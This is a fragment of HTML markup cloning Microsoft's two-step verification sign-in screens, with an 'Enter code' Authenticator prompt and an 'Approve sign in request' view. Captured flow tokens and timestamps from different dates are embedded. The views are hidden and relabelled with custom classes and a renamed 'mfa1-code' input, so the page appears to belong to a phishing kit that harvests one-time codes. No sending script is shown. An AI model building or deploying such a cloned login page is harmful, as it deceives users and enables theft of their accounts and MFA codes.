            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        <!-- /ko -->
    </div>
	
	
	
	
	<div style="display:none;" class="show-mfa1-code pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
        \'has-identity-banner\': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        \'zero-opacity\': hidePaginatedView.hideSubView(),
        \'animate\': animate(),
        \'slide-out-next\': animate.isSlideOutNext(),
        \'slide-in-next\': animate.isSlideInNext(),
        \'slide-out-back\': animate.isSlideOutBack(),
        \'slide-in-back\': animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-showidentitybanner="true" data-bind="pageViewComponent: { name: \'otc-confirm-view\',
                    params: {
                        serverData: svr,
                        serverError: initialError,
                        username: sharedData.username,
                        focusDefaultField: true,
                        supportsBack: true,
                        isInitialState: isInitialState,
                        sentProof: sharedData.sentProof,
                        otcProofs: sharedData.otcProofs,
                        isGeneralVerify: sharedData.isGeneralVerify,
                        proofConfirmation: sharedData.proofConfirmation,
                        showCancelButton: sharedData.showCancelButton,
                        trustedDeviceCheckboxConfig: sharedData.trustedDeviceCheckboxConfig,
                        currentPollStartTime: sharedData.currentPollStartTime,
                        currentPollEndTime: sharedData.currentPollEndTime,
                        sessionIdentifier: sharedData.sessionIdentifier,
                        twoWayPollingNeeded: sharedData.twoWayPollingNeeded,
                        hasTotpV2Only: sharedData.hasTotpV2Only,
                        hasTotpV1Only: sharedData.hasTotpV1Only,
                        flowToken: sharedData.flowToken },
                    event: {
                        cancel: view_onCancel,
                        updateFlowToken: $tfaPage.view_onUpdateFlowToken,
                        showDebugDetails: $tfaPage.toggleDebugDetails_onClick,
                        submitReady: $tfaPage.view_onSubmitReady,
                        setPendingRequest: $tfaPage.view_onSetPendingRequest,
                        setBackButtonState: view_onSetIdentityBackButtonState } }"><!--  -->

<input type="hidden" name="type" data-bind="value: postType" value="19">
<input type="hidden" name="GeneralVerify" data-bind="value: isGeneralVerify" value="false">
<input type="hidden" name="request" data-bind="value: svr.sCtx" value="rQQIARAAjZI7bNNgAITtOjVJaaHqAEgMIGAB1cn_-xHXkZDI22mUNI5TomSJXPvPo7H9J37ESVgQLIwdWGBk7ARIlaoOqHMrpM6dEAsVAgkYoCOtWNjghtONp_vuHgWjMHEH_BHLnDsD2m3I6Og8_SVnaW7x_fdje2df3dnN_ry-LPxC2-SNrucN3EQshn3PxLgfxe12T0dRHVsxHGixXZI8IskTktyeEeOcKEFOEgWRjQO4IgIxKmkACCsGZCDkdIYHaIPReJ5jdCjyiNVEUWDF45nLa0nf67Lnhp3eFP2YibSxY7UG2PVeUp_ITMOXMrgQ5JOpFMevlxkDp-UxW-jw5ljJl5WkWGy0OkDLPiwUxw7iAgmCXNBMuRXNraRzfKrZmQqF6ni6mrGUJM5ycjLVT9W1cUEJcprRaaanqlmqFxv5IVZKAe6OBKPvZ52-D3GXE4BQr6GqY8nr-WGjMuHVickyjl1ly57c72ZKZk-bVmuMvxmH6aIScEO9NHFkKIE6YFTdHMHRWisuxX2xmZZWG0253B6oIm_nRjU7tZl3Ba9lVMqisrJN_ReotxR9tr6F7QOKxgNk94yP1G1k9cxJNOiZZ2UsF9sPdGRoTsdEdhdbyD3ndRQiP4TIz6F5QCXC4blF4hpxkzgNka9mz8i_iQ6uXH30uvj4HXEoezZxMBszjHWvWx3CtApHNcVDI1ewLKHTVlFFk5KcbTbjIOsLYOq596UE3KLJLZreoyNhapG4RaUr8IQmv9HUswvkXuRfNzq6SD6ZXwgTS5HI9K6_vKEey_sLxOmlw68HT198ef5V_g01">
<input type="hidden" name="mfaLastPollStart" data-bind="value: currentPollStartTime" value="1655801034968">
<input type="hidden" name="mfaLastPollEnd" data-bind="value: currentPollEndTime" value="1655801035874">

<input type="hidden" data-bind="attr: { name: svr.sAuthMethodInputFieldName }, value: proofData" name="mfaAuthMethod" value="PhoneAppOTP">

<!-- ko if: svr.canary -->
<input type="hidden" name="canary" data-bind="value: svr.canary" value="ddUthRq1CS1vTQtevs5mm5gfSePa9A3nlZ60Eu50zts=4:1">
<!-- /ko -->
<!-- ko if: proofConfirmation --><!-- /ko -->

<div id="idDiv_SAOTCC_Title" class="row text-title" role="heading" aria-level="1" data-bind="text: twoWayPollingNeeded ? str[\'CT_SAOTCAS_STR_Title\'] : str[\'CT_SAOTCS_STR_Title\']">Enter code</div>
<div class="row text-body">
    <div data-bind="component: { name: \'proof-image-control\', params: { type: proofImageType, small: true, animate: twoWayPollingNeeded } }"><!--  -->

<!-- ko if: type === PROOF.Type.Email --><!-- /ko -->

<!-- ko if: type === PROOF.Type.SMS || type === PROOF.Type.TwoWaySMS || type === PROOF.Type.TwoWaySMSAlternateMobile --><!-- /ko -->

<!-- ko if: type === PROOF.Type.Voice || type === PROOF.Type.TwoWayVoice || type === PROOF.Type.TwoWayVoiceAlternateMobile || type === PROOF.Type.TwoWayVoiceOffice --><!-- /ko -->

<!-- ko if: type === PROOF.Type.TOTPAuthenticatorV2 --><!-- /ko -->

<!-- ko if: type === PROOF.Type.TOTPAuthenticator -->
    <!-- ko component: \'accessible-image-control\' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img small" role="presentation" pngsrc="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsSAAALEgHS3X78AAABj0lEQVRo3u2Z0W3CMBCGP6q+wwjdgHSCxhOUEdigbNB0g3aC0gmgE/xhg7AB3QAmoC9nyYpCQaKKob17IbId6T7f/58NDPb7PdccN1x5OIADOIADOIADOEDOuD22IISQ9bIkafC/K3DqTvx2nFp5N7ED9OWBH7RaAltJTcc4QCNp25obAYV5q84CEEKYABUwBlZAaeMVMAOGydo3STN7buydOLcDCkmb3iQUQqiBRZpIEqUl/wXsbOzJgLF30rmhbUTvHtgB647xGgiS7qJMLOLzfTIX35/0DTCTNAKWHedFdUDX0Qcb80cBjBLo/jzQNuwBmRXAPKnWPKmEkqUrYHpRbTSEMLVdHVvyZdKJtpZ09MCDmf4yACz5dzPn2jpMk1ZPUmkS/LDhZ2ut/Z8DHfFqn5+SJi24aN7aKrJJJEZ2ANN97P+PrQvZi8lqkfT/uHbZPuxySeiYDKL+SZJfneOBsyogqUoPIWufx67dpV/mHMABMnwfyP3rxJ+twMD/I3MAB3AAB3AAB3CAfwzwDf8fjMydA+KUAAAAAElFTkSuQmCC" svgsrc="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDQ4IDQ4Ij48dGl0bGU+YXNzZXRzPC90aXRsZT48cmVjdCB3aWR0aD0iNDgiIGhlaWdodD0iNDgiIGZpbGw9Im5vbmUiLz48cGF0aCBkPSJNMzgsMTRIMTBWMzRIMzhWMTRtMiwyMkg4VjEySDQwVjM2TTE3LjY4OCwxOC44VjI4LjgyOEgxNS41MzFWMjEuMjM0YTMuMiwzLjIsMCwwLDEtLjY3Mi40M2wtLjI2Ni4xMTdhMi41NSwyLjU1LDAsMCwxLS41NjIuMTg4LDIuNDIzLDIuNDIzLDAsMCwxLS4zLjA3cS0uMTQxLjAyMy0uMjgxLjA1NVYyMC4yNjZxLjQyMi0uMTI1LjgxMy0uMjgxdC43NjYtLjM0NGE4LjI1Myw4LjI1MywwLDAsMCwxLjM0NC0uODQ0aDEuMzEzbTQuNTMxLDguMjM0aDQuMTU2djEuOEgxOS44NTl2LS43NWEzLjI5MiwzLjI5MiwwLDAsMSwuMjUtMS4zNDQsNC4xODMsNC4xODMsMCwwLDEsLjYyNS0xLjA3OCw1LjcsNS43LDAsMCwxLC44NDQtLjgyOHEuMjE5LS4xODcuNDM4LS4zNTJ0LjQyMi0uMzJxLjQ1My0uMzEyLjc2Ni0uNTc4YTIuNTkzLDIuNTkzLDAsMCwwLC4zLS4yODFsLjI1LS4yODFhMy4xNDgsMy4xNDgsMCwwLDAsLjMyOC0uNTYyLDEuNTksMS41OSwwLDAsMCwuMTA5LS42MDksMS4xNzYsMS4xNzYsMCwwLDAtLjM1OS0uOTM3LDEuNTUyLDEuNTUyLDAsMCwwLTEuMDc4LS4zMjgsMy42MjUsMy42MjUsMCwwLDAtMi40MjIsMVYxOS42ODhhNC44NjYsNC44NjYsMCwwLDEsMS4zNTktLjYyNSw1LjU0OCw1LjU0OCwwLDAsMSwxLjUxNi0uMiw0LjQ1Niw0LjQ1NiwwLDAsMSwxLjM0NC4xODgsMi40NjEsMi40NjEsMCwwLDEsMSwuNTYzLDIuMjQyLDIuMjQyLDAsMCwxLC42MjUuODc1LDMuMDA3LDMuMDA3LDAsMCwxLC4yMTksMS4xNTYsMy41MzgsMy41MzgsMCwwLDEtLjA1NS42NDEsMy43LDMuNywwLDAsMS0uMTQ4LjU2MywzLjQzOSwzLjQzOSwwLDAsMS0uNTYyLjk1Myw3LjIsNy4yLDAsMCwxLS44LjhxLS4yMTkuMTcyLS40NTMuMzQ0dC0uNDg0LjM0NGwtLjMyLjIzNHEtLjE0OC4xMDktLjMuMjM0LS4xNTYuMTA5LS4yODkuMjE5dC0uMjU4LjIxOXEtLjEwOS4xMjUtLjIuMjI3dC0uMTY0LjIxMWEuNzYzLjc2MywwLDAsMC0uMTQxLjQwNk0yNy44MjgsMjguNVYyNi42MjVhMy44MzUsMy44MzUsMCwwLDAsMi4zLjcxOSwyLjEyOCwyLjEyOCwwLDAsMCwxLjMtLjM1OSwxLjIsMS4yLDAsMCwwLC40NTMtMSwxLjEyNiwxLjEyNiwwLDAsMC0uNTYyLTEsMy4wMjYsMy4wMjYsMCwwLDAtMS41NzgtLjM1OWgtLjkwNlYyMi45NjloLjg0NHExLjkwNiwwLDEuOTA2LTEuMjY2LDAtMS4yLTEuNDY5LTEuMmEzLjMsMy4zLDAsMCwwLTEuOTA2LjY0MVYxOS4zNzVhNS4zMTYsNS4zMTYsMCwwLDEsMi40MDYtLjUxNiwzLjYzMSwzLjYzMSwwLDAsMSwyLjM0NC42NzIsMi4xNzUsMi4xNzUsMCwwLDEsLjgyOCwxLjc1LDIuMjcxLDIuMjcxLDAsMCwxLTEuOTUzLDIuNDA2di4wNDdhMi42LDIuNiwwLDAsMSwxLjY0MS43NSwyLjE0NCwyLjE0NCwwLDAsMSwuNjA5LDEuNTMxLDIuNjU1LDIuNjU1LDAsMCwxLTEsMi4xNzJBNC4zLDQuMywwLDAsMSwzMC4zLDI5LDUuMzY1LDUuMzY1LDAsMCwxLDI3LjgyOCwyOC41WiIgZmlsbD0iIzQwNDA0MCIvPjwvc3ZnPg==" data-bind="imgSrc, css: { \'small\': small }" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDQ4IDQ4Ij48dGl0bGU+YXNzZXRzPC90aXRsZT48cmVjdCB3aWR0aD0iNDgiIGhlaWdodD0iNDgiIGZpbGw9Im5vbmUiLz48cGF0aCBkPSJNMzgsMTRIMTBWMzRIMzhWMTRtMiwyMkg4VjEySDQwVjM2TTE3LjY4OCwxOC44VjI4LjgyOEgxNS41MzFWMjEuMjM0YTMuMiwzLjIsMCwwLDEtLjY3Mi40M2wtLjI2Ni4xMTdhMi41NSwyLjU1LDAsMCwxLS41NjIuMTg4LDIuNDIzLDIuNDIzLDAsMCwxLS4zLjA3cS0uMTQxLjAyMy0uMjgxLjA1NVYyMC4yNjZxLjQyMi0uMTI1LjgxMy0uMjgxdC43NjYtLjM0NGE4LjI1Myw4LjI1MywwLDAsMCwxLjM0NC0uODQ0aDEuMzEzbTQuNTMxLDguMjM0aDQuMTU2djEuOEgxOS44NTl2LS43NWEzLjI5MiwzLjI5MiwwLDAsMSwuMjUtMS4zNDQsNC4xODMsNC4xODMsMCwwLDEsLjYyNS0xLjA3OCw1LjcsNS43LDAsMCwxLC44NDQtLjgyOHEuMjE5LS4xODcuNDM4LS4zNTJ0LjQyMi0uMzJxLjQ1My0uMzEyLjc2Ni0uNTc4YTIuNTkzLDIuNTkzLDAsMCwwLC4zLS4yODFsLjI1LS4yODFhMy4xNDgsMy4xNDgsMCwwLDAsLjMyOC0uNTYyLDEuNTksMS41OSwwLDAsMCwuMTA5LS42MDksMS4xNzYsMS4xNzYsMCwwLDAtLjM1OS0uOTM3LDEuNTUyLDEuNTUyLDAsMCwwLTEuMDc4LS4zMjgsMy42MjUsMy42MjUsMCwwLDAtMi40MjIsMVYxOS42ODhhNC44NjYsNC44NjYsMCwwLDEsMS4zNTktLjYyNSw1LjU0OCw1LjU0OCwwLDAsMSwxLjUxNi0uMiw0LjQ1Niw0LjQ1NiwwLDAsMSwxLjM0NC4xODgsMi40NjEsMi40NjEsMCwwLDEsMSwuNTYzLDIuMjQyLDIuMjQyLDAsMCwxLC42MjUuODc1LDMuMDA3LDMuMDA3LDAsMCwxLC4yMTksMS4xNTYsMy41MzgsMy41MzgsMCwwLDEtLjA1NS42NDEsMy43LDMuNywwLDAsMS0uMTQ4LjU2MywzLjQzOSwzLjQzOSwwLDAsMS0uNTYyLjk1Myw3LjIsNy4yLDAsMCwxLS44LjhxLS4yMTkuMTcyLS40NTMuMzQ0dC0uNDg0LjM0NGwtLjMyLjIzNHEtLjE0OC4xMDktLjMuMjM0LS4xNTYuMTA5LS4yODkuMjE5dC0uMjU4LjIxOXEtLjEwOS4xMjUtLjIuMjI3dC0uMTY0LjIxMWEuNzYzLjc2MywwLDAsMC0uMTQxLjQwNk0yNy44MjgsMjguNVYyNi42MjVhMy44MzUsMy44MzUsMCwwLDAsMi4zLjcxOSwyLjEyOCwyLjEyOCwwLDAsMCwxLjMtLjM1OSwxLjIsMS4yLDAsMCwwLC40NTMtMSwxLjEyNiwxLjEyNiwwLDAsMC0uNTYyLTEsMy4wMjYsMy4wMjYsMCwwLDAtMS41NzgtLjM1OWgtLjkwNlYyMi45NjloLjg0NHExLjkwNiwwLDEuOTA2LTEuMjY2LDAtMS4yLTEuNDY5LTEuMmEzLjMsMy4zLDAsMCwwLTEuOTA2LjY0MVYxOS4zNzVhNS4zMTYsNS4zMTYsMCwwLDEsMi40MDYtLjUxNiwzLjYzMSwzLjYzMSwwLDAsMSwyLjM0NC42NzIsMi4xNzUsMi4xNzUsMCwwLDEsLjgyOCwxLjc1LDIuMjcxLDIuMjcxLDAsMCwxLTEuOTUzLDIuNDA2di4wNDdhMi42LDIuNiwwLDAsMSwxLjY0MS43NSwyLjE0NCwyLjE0NCwwLDAsMSwuNjA5LDEuNTMxLDIuNjU1LDIuNjU1LDAsMCwxLTEsMi4xNzJBNC4zLDQuMywwLDAsMSwzMC4zLDI5LDUuMzY1LDUuMzY1LDAsMCwxLDI3LjgyOCwyOC41WiIgZmlsbD0iIzQwNDA0MCIvPjwvc3ZnPg=="><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko -->

<!-- ko if: type === PROOF.Type.FidoKey --><!-- /ko -->

<!-- ko if: type === PROOF.Type.AccessPass --><!-- /ko --></div>
    <div id="idDiv_SAOTCC_Description" class="text-block-body overflow-hidden" data-bind="text: description">Enter the code displayed in the Microsoft Authenticator app on your mobile device​</div>
</div>

<div class="text-block-body">
    <div id="idDiv_SAOTCC_OTCRow" class="form-group">
        <div role="alert" class="mfa-error" aria-live="assertive" style="display:none;">
				
            <!-- ko if: error -->
            <div class="row">
                <div id="idDiv_SAOTCC_ErrorMsg_OTC" class="alert alert-error first">
                    <span id="idSpan_SAOTCC_Error_OTC" data-bind="html: error">You didn\'t enter the expected verification code. Please try again.</span>
                    <!-- ko if: svr.fShowViewDetailsLink -->
                    <a id="ViewDetails" class="no-wrap" href="#" data-bind="
                        text: str[\'CT_STR_Error_ViewDetails\'],
                        clickExpr: onShowDebugDetails(debugDetails, true),
                        ariaLabel: str[\'CT_STR_Error_ViewDetailsAriaLabel\']" aria-label="View debugging details for this error">View details</a>
                    <!-- /ko -->
                </div>
            </div>
            <!-- /ko -->
        
        </div>
        <div id="idDiv_SAOTCC_Success_OTC" class="errorDiv" style="display: none;">
            <span id="idSpan_SAOTCC_Success_OTC" class="success"></span>
        </div>
        <!-- ko ifnot: twoWayPollingNeeded || hideInputControls() -->
        <div id="idDiv_SAOTCC_OTC" class="textbox form-group">
            <div class="placeholderContainer" data-bind="component: { name: \'placeholder-textbox-field\',
                publicMethods: otcInputTextbox.placeholderTextboxMethods,
                params: {
                    serverData: svr,
                    hintText: str[\'CT_SAOTCC_STR_OTC_TBHint\'] },
                event: {
                    updateFocus: otcInputTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { \'$placeholderText\': placeholderText } -->
    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

                <input id="idTxtBx_SAOTCC_OTC" name="mfa1-code" class="mfa1-code form-control" type="tel" autocomplete="off" aria-required="true" data-bind="
                    attr: {
                        \'maxlength\': otcLength,
                        \'aria-labelledby\': \'idDiv_SAOTCC_Title\',
                        \'aria-describedby\': \'idDiv_SAOTCS_Title idDiv_SAOTCC_Description idSpan_SAOTCC_Error_OTC\' },
                    css: { \'has-error\': error },
                    textInput: otcInputTextbox.value,
                    ariaLabel: str[\'CT_SAOTCC_STR_OTC_TBHint\'],
                    hasFocusEx: otcInputTextbox.focused,
                    placeholder: $placeholderText" maxlength="6" aria-labelledby="idDiv_SAOTCC_Title" aria-describedby="idDiv_SAOTCS_Title idDiv_SAOTCC_Description idSpan_SAOTCC_Error_OTC" aria-label="Code" placeholder="Code">
            <!-- /ko -->
<!-- /ko -->
<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>
        </div>

        <!-- ko if: twoFactorAuthPinEnabled --><!-- /ko -->
        <!-- /ko -->
    </div>
</div>
<div class="text-block-body text-body" data-bind="visible: showSendNotification" style="display: none;">
    <a id="idA_SAOTCC_SendNotification" href="#" data-bind="html: str[\'CT_SAOTCC_STR_SendNotification\'], click: switchToSessionApproval_onClick">Send an identity verification request to my Microsoft Authenticator app.</a>
</div>

<div data-bind="css: { \'position-buttons\': !tenantBranding.BoilerPlateText &amp;&amp; !twoWayPollingNeeded }">
    <div class="row">
        <div id="idDiv_SAOTCC_TD_Section" class="no-margin-top-bottom" data-bind="visible: tdCheckbox.isShown &amp;&amp; !hideInputControls()">
            <div id="idDiv_SAOTCC_TD" class="col-md-24 form-group no-margin-top checkbox">
                <label id="idLbl_SAOTCC_TD_Cb">
                    <input id="idChkBx_SAOTCC_TD" type="checkbox" value="true" data-bind="checked: tdCheckbox.isChecked, disable: tdCheckbox.isDisabled, ariaLabel: str[\'CT_SAOTCC_STR_AddTD\'], attr: { name: svr.sTrustedDeviceCheckboxName }" name="rememberMFA" aria-label="Don\'t ask again for 30 days">
                    <span data-bind="text: str[\'CT_SAOTCC_STR_AddTD\']">Don\'t ask again for 30 days</span>
                </label>
            </div>
        </div>

        <!-- ko if: isInitialState || svr.urlMoreInfo -->
        <div class="col-md-24">
            <div class="text-13">
                <!-- ko if: isInitialState && showSwitchProofsLink -->
                <div class="form-group" id="idDiv_SAOTCS_HavingTrouble" data-bind="
                        htmlWithBindings: str[\'CT_SAOTCC_STR_Toggle\'],
                        childBindings: { \'signInAnotherWay\': { click: switchToOtcRequest_onClick } }">Having trouble? <a href="#" id="signInAnotherWay">Sign in another way</a></div>
                <!-- /ko -->
                <!-- ko if: svr.urlMoreInfo -->
                <div data-bind="css: { \'form-group\': !twoWayPollingNeeded }" class="form-group">
                    <a id="moreInfoUrl" target="_blank" href="https://go.microsoft.com/fwlink/p/?LinkId=708614" data-bind="
                            text: str[\'CT_STR_More_Info\'],
                            href: svr.urlMoreInfo,
                            ariaLabel: str[\'CT_STR_More_Info_AriaLabel\']" aria-label="More information about two step verification">More information</a>
                </div>
                <!-- /ko -->
            </div>
        </div>
        <!-- /ko -->
    </div>
</div>

<div class="win-button-pin-bottom boilerplate-button-bottom" data-bind="css : { \'boilerplate-button-bottom\': tenantBranding.BoilerPlateText }">
    <div class="row move-buttons" data-bind="css: { \'move-buttons\': tenantBranding.BoilerPlateText }">
        <div data-bind="component: { name: \'footer-buttons-field\',
            params: {
                serverData: svr,
                removeBottomMargin: true,
                primaryButtonId: \'idSubmit_SAOTCC_Continue\',
                primaryButtonText: str[\'CT_SAOTCC_STR_Continue\'],
                secondaryButtonId: \'idBtn_Back\',
                secondaryButtonText: str[\'CT_SAOTCC_STR_Cancel\'],
                isSecondaryButtonVisible: !showSwitchProofsLink,
                isPrimaryButtonVisible: svr.fShowButtons &amp;&amp; !twoWayPollingNeeded &amp;&amp; !hideInputControls(),
                secondaryButtonDescribedBy: (svr.fShowButtons &amp;&amp; twoWayPollingNeeded) ? \'idDiv_SAOTCC_Description\' : null },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container no-margin-bottom" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { \'no-margin-bottom\': removeBottomMargin }">

    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

    <div data-bind="css: { \'inline-block\': isPrimaryButtonVisible }" class="inline-block">
        <!-- type="submit" is needed in-addition to \'type\' in primaryButtonAttributes observable to support IE8 -->
        <input type="submit" id="idSubmit_SAOTCC_Continue" class="submit-mfa1-code btn btn-block btn-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    \'button\': true,
                    \'primary\': true },
                value: primaryButtonText() || str[\'CT_PWD_STR_SignIn_Button_Next\'],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value="Verify">
    </div>
</div></div>
    </div>
</div>

<!-- ko if: tenantBranding.BoilerPlateText -->
<div id="idBoilerPlateText" class="wrap-content boilerplate-text" data-bind="
    htmlWithMods: tenantBranding.BoilerPlateText,
    htmlMods: { filterLinks: svr.fIsHosted },
    css: { \'transparent-lightbox\': tenantBranding.UseTransparentLightBox }"><p></p>
</div>
<!-- /ko --></div><!-- /ko -->
            <!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        <!-- /ko -->
    </div>
	
	
	<div style="display:none;" class="show-mfa2-code pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
        \'has-identity-banner\': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        \'zero-opacity\': hidePaginatedView.hideSubView(),
        \'animate\': animate(),
        \'slide-out-next\': animate.isSlideOutNext(),
        \'slide-in-next\': animate.isSlideInNext(),
        \'slide-out-back\': animate.isSlideOutBack(),
        \'slide-in-back\': animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="6" data-showidentitybanner="true" data-bind="pageViewComponent: { name: \'session-approval-view\',
                    params: {
                        serverData: svr,
                        sentProof: sharedData.sentProof,
                        username: sharedData.username,
                        supportsBack: true,
                        isInitialState: isInitialState,
                        sessionIdentifier: sharedData.sessionIdentifier,
                        showCancelButton: sharedData.showCancelButton,
                        trustedDeviceCheckboxConfig: sharedData.trustedDeviceCheckboxConfig,
                        currentPollStartTime: sharedData.currentPollStartTime,
                        currentPollEndTime: sharedData.currentPollEndTime,
                        twoWayPollingNeeded: sharedData.twoWayPollingNeeded,
                        sessionApprovalError: sharedData.sessionApprovalError,
                        flowToken: sharedData.flowToken,
                        entropy: sharedData.entropy },
                    event: {
                        cancel: view_onCancel,
                        updateSessionIdentifier: $tfaPage.view_onUpdateSessionIdentifier,
                        updateFlowToken: $tfaPage.view_onUpdateFlowToken,
                        submitReady: $tfaPage.view_onSubmitReady } }"><!--  -->

<input type="hidden" name="type" data-bind="value: \'22\'" value="22">
<input type="hidden" name="request" data-bind="value: svr.sCtx" value="rQQIARAAhVNPiON0FG7amdrWXXcYRdcFYQ5zEDHtL_-TgQXTSTtpTdJp07TTXmr-tmmT_NImbZoePe1xTgu7F8HjHAUX2ZNe57TIgjDiHoS9DCiLIqwgaFfPiw_e4z2-9w6P7_tKBbqM02WsDD7K4WVwdEgyNEWSlIESuEmjJGcAlCVsGsUsjthCOEOb-mK_tPfogztXL_6an9x_9MdJ5Yvx0wvkYBLHYXRUqSRJUoaO45p22YR-xdMDyw3GK_wbBHmCIA-zu3aAaupFNqIJFuNIjmEIBjDcNqiy3Nco2W-QytSMW0JvoqgADLpjQtrmYNOOFcGbtASNHOByst3dKH4DyN3qTO6O4-GJRiopAMNubyp1J96gP4iHQnuj9DVii1EKLq-vsrda_DKe4K8KXLgb-7ds0YELfxTCKH6Yu5-VNPS0o2_mprNwrXlfjUN1JIta7M1I3h2P0TbXSjstDbPj1kwdUY1hkzvrBMkKBoKSduIgRKGasmq3K9Wqx2Sq6jX706ZmwGMwIacS37A5HkbTlckKq8TfEKnndL0zerhAFVZfeseaveBrbt0Z1hTLV9QqrgW4gU3Mdl2wzupA9JUYzjbSNPTloL0eUJbcJtl-yAhcbwQ3rqoOxMnohMeY3nriEAE_5cmZVx14YTNYAFpfU9W1ZbUEpaaLXg_U6jVqZttiY15fSpQYhHgNN22DTano1AMY1mkqSbU5k8YXufdfQ-8K_yqX3zY-DB7nDh2a4TDOMFDMxkyUpG0cNXBORwFDW6TjEIClycscA0M7cK2DcAEd17Nfp5wVXmn9O4nQt8u85_2cO9RNEy6D-JPQ09Mtb5aj-66X-rblmrr36qqsL5_sINc77xbye3duIweZD98BuaNCobSXuZ05yLzcQb7c3er3wU-_fvfen_nGvd4Pb54_72cudytBAjW-FzWHHVZqKkHLT4xVsuhFIhltYgOslWXYXrM9STGSu-wRdp5HzvP5y3yxIYyUWpcegRf57L03kMfF_3XC5zduFjL7xWLhuvjZ750fxasbb5dKS3fkwe0TdrT_n0O-vZl5-db3fz949vWzp7-I17c-5vlUIsS1R3B9UuKI-lnod6CT6LLextWwwhjD-SkTrQTsOLn7Dw2">
<input type="hidden" name="mfaLastPollStart" data-bind="value: currentPollStartTime" value="1683900946358">
<input type="hidden" name="mfaLastPollEnd" data-bind="value: currentPollEndTime" value="1683900947657">

<!-- ko if: twoWayPollingNeeded -->
    <!-- ko if: isCompanionApp --><!-- /ko -->

    <!-- ko ifnot: isCompanionApp -->
        <input type="hidden" data-bind="attr: { name: svr.sAuthMethodInputFieldName }, value: \'PhoneAppNotification\'" name="mfaAuthMethod" value="PhoneAppNotification">
    <!-- /ko -->
<!-- /ko -->

<div id="idDiv_SAOTCAS_Title" class="row text-title" role="heading" aria-level="1" data-bind="text: title">Approve sign in request</div>
<div class="row text-body">
    <div data-bind="component: { name: \'proof-image-control\', params: { type: PROOF.Type.TOTPAuthenticatorV2, small: true, animate: true } }"><!--  -->

<!-- ko if: type === PROOF.Type.Email --><!-- /ko -->

<!-- ko if: type === PROOF.Type.SMS || type === PROOF.Type.TwoWaySMS || type === PROOF.Type.TwoWaySMSAlternateMobile --><!-- /ko -->

<!-- ko if: type === PROOF.Type.Voice || type === PROOF.Type.TwoWayVoice || type === PROOF.Type.TwoWayVoiceAlternateMobile || type === PROOF.Type.TwoWayVoiceOffice --><!-- /ko -->

<!-- ko if: type === PROOF.Type.TOTPAuthenticatorV2 -->
    <!-- ko component: \'accessible-image-control\' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
